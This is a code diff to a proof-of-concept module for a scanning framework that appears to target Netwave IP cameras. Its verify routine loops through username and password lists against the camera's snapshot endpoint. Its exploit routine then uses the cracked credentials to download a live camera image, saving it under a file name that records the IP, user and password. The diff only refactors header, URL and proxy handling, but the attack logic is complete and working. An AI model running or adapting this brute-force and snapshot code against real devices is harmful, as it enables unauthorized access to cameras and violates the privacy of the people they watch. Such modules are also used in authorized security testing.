@@ -15,19 +15,21 @@ class NetwaveWeakPassword(POCTemplate):
         self.ref = ''
         self.level = POCTemplate.level.low
         self.desc = """"""
-        self.headers = {'Connection': 'close', 'User-Agent': self.config.user_agent}
 
     def verify(self, ip, port=80):
+        headers = self._get_headers()
+        proxies = self._get_proxies()
         for user in self.config.users:
             for password in self.config.passwords:
                 try:
                     r = requests.get(
-                        url=f"http://{ip}:{port}/snapshot.cgi",
+                        url=self._get_url(ip, port, '/snapshot.cgi'),
                         auth=(user, password),
                         timeout=self.config.timeout,
-                        headers=self.headers,
+                        headers=headers,
                         verify=False,
-                        stream=True
+                        stream=True,
+                        proxies=proxies
                     )
                     if r.status_code == 200:
                         return ip, str(port), self.product, str(user), str(password), self.name
@@ -38,7 +40,7 @@ class NetwaveWeakPassword(POCTemplate):
     def exploit(self, results):
         ip, port, product, user, password, vul = results
         img_file_name = f"{ip}-{port}-{user}-{password}.jpg"
-        url = f"http://{ip}:{port}/snapshot.cgi"
+        url = self._get_url(ip, port, '/snapshot.cgi')
         return self._snapshot(url, img_file_name, auth=(user, password))
 
 POCTemplate.register_poc(NetwaveWeakPassword)
